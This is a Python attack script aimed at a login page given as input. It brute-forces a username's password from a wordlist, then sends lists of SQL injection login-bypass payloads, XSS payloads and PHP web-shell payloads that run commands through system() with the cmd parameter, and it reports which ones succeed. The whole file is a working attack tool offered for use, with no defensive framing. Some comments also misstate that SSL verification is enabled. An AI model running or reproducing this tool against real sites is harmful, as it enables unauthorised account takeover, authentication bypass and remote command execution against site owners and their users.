import requests
import urllib3

#colors
class color:
    red = '\33[91m'
    white = '\033[0m'
    green = '\033[92m'

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Prompt for target URL
url = input("Enter a login page to try: ")

# Prompt for username
username = input("Enter a username to try: ")

# Prompt password list file
password_file = input("Enter the path of passwordlist(wordlist) to try: ")

# List of passwords
with open(password_file, "r") as file:
    passwords = file.read().splitlines()

# List of SQL injection payloads
sql_payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "') OR ('1'='1",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR 1=1 LIMIT 1--",
    "' OR 'x'='x' LIMIT 1--",
    "') OR ('x'='x') LIMIT 1--",
    "' OR 1=1#",
    "' OR 'x'='x'#",
    "') OR ('x'='x')#",
    "' OR 1=1 LIMIT 1#",
    "' OR 'x'='x' LIMIT 1#",
    "') OR ('x'='x') LIMIT 1#",
    "' OR 1=1; --",
    "' OR '1'='1' OR '1'='1' -- ",
    "' OR '1'='1' OR '1'='1' -- ",
    "' OR 1=1;/*",
    "' OR 'x'='x' OR '1'='1' -- ",
    "' OR 'x'='x' OR '1'='1' -- ",
    "' OR 1=1 LIMIT 1; -- ",
    "' OR 'x'='x' LIMIT 1; -- ",
    "' OR 1=1 LIMIT 1;/*",
    "' OR 'x'='x' LIMIT 1;/*",
    "' OR 1=1;#",
    "' OR 'x'='x'#",
    "' OR 1=1 LIMIT 1;#",
    "' OR 'x'='x' LIMIT 1;#"
]

# List of XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<a href=javascript:alert('XSS')>Click Me</a>",
    "<body onload=alert('XSS')>"
]

# List of PHP payloads
php_payloads = [
    "<?php echo 'XSS'; ?>",
    "<?php echo $_GET['xss']; ?>",
    "<?php system('ls'); ?>",
    "<?php $cmd = 'ls'; system($cmd); ?>",
    "<?php $cmd = $_GET['cmd']; system($cmd); ?>",
    "<?php $cmd = $_POST['cmd']; system($cmd); ?>",
    "<?php $cmd = $_REQUEST['cmd']; system($cmd); ?>",
    "<?php $cmd = $_COOKIE['cmd']; system($cmd); ?>",
    "<?php $cmd = $_SESSION['cmd']; system($cmd); ?>",
    "<?php $cmd = $_SERVER['cmd']; system($cmd); ?>",
    "<?php $cmd = $_ENV['cmd']; system($cmd); ?>"
]

# Try each password
print("Testing passwords...")
for password in passwords:
    # Prepare the request data
    data = {
        "username": username,
        "password": password
    }
    
    # Send the POST request with SSL verification enabled
    response = requests.post(url, data=data)
    
    # Check if the password was successful
    if "Welcome" in response.text:
        print(f"" + color.green + "[+]" + color.white + f" Password works. Login with {username} and {password} success!")
    else:
        print(f"" + color.red + "[-]" + color.white + f" Password faild. Login with {username} and {password} faild!")

# Try each SQL injection payload
print("Testing SQL Injection...")
for payload in sql_payloads:
    # Prepare the request data
    data = {
        "username": payload,
        "password": "password"
    }
    
    # Send the POST request with SSL verification enabled
    response = requests.post(url, data=data)
    
    # Check if the SQL injection payload was successful
    if "Welcome" in response.text:
        print(f"" + color.green + "[+]" + color.white + f" SQL Injection vulnerability works. Login with {payload} and password success!")
    else:
        print(f"" + color.red + "[-]" + color.white + f" SQL Injection vulnerability faild. Login with {payload} and password faild!")

# Try each XSS payload
print("Testing XSS...")
for payload in xss_payloads:
    # Prepare the request data
    data = {
        "username": username,
        "password": payload
    }
    
    # Send the POST request with SSL verification enabled
    response = requests.post(url, data=data)
    
    # Check if the XSS payload was successful
    if payload in response.text:
        print(f"" + color.green + "[+]" + color.white + f" XSS vulnerability works. Login with {username} and {payload} success!")
    else:
        print(f"" + color.red + "[-]" + color.white + f" XSS vulnerability faild. Login with {username} and {payload} faild!")

# Try each PHP payload
print("Testing PHP...")
for payload in php_payloads:
    # Prepare the request data
    data = {
        "username": username,
        "password": payload
    }
    
    # Send the POST request with SSL verification enabled
    response = requests.post(url, data=data)
    
    # Check if the PHP payload was successful
    if payload in response.text:
        print(f"" + color.green + "[+]" + color.white + f" PHP vulnerability works. Login with {username} and {payload} success!")
    else:
        print(f"" + color.red + "[-]" + color.white + f" PHP vulnerability faild. Login with {username} and {payload} faild!")
